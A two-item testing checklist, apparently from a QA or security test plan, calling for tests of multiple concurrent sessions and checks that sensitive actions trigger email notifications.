- Test with multiple concurrent sessions
- Verify that sensitive actions trigger email notifications
